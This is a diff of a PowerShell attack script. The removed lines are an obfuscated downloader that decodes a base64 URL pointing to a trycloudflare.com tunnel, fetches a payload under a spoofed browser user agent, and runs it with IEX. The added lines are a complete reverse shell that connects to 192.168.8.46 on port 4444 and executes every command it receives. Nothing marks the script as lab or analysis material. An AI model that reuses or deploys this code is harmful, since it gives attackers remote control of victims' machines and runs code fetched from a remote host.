@@ -1,11 +1,18 @@
-$s = "aHR0cHM6Ly9yaWdodHMtc2hlZXQtbWVsLXdlZWtlbmQudHJ5Y2xvdWRmbGFyZS5jb20="
-$u = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($s))
-$w = New-Object System.Net.WebClient
-$w.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
+$ip = "192.168.8.46"
+$port = 4444
 try {
-    $d = $w.DownloadData($u)
-    $c = [System.Text.Encoding]::ASCII.GetString($d)
-    IEX $c
+    $client = New-Object System.Net.Sockets.TCPClient($ip, $port)
+    $stream = $client.GetStream()
+    [byte[]]$bytes = 0..65535|%{0}
+    while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
+        $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
+        $sendback = (iex $data 2>&1 | Out-String )
+        $prompt = $sendback + "PS " + (pwd).Path + "> "
+        $sendbyte = ([text.encoding]::ASCII).GetBytes($prompt)
+        $stream.Write($sendbyte, 0, $sendbyte.Length)
+        $stream.Flush()
+    }
+    $client.Close()
 } catch {
-    # في حال فشل الاتصال بالنفق
+    exit
 }
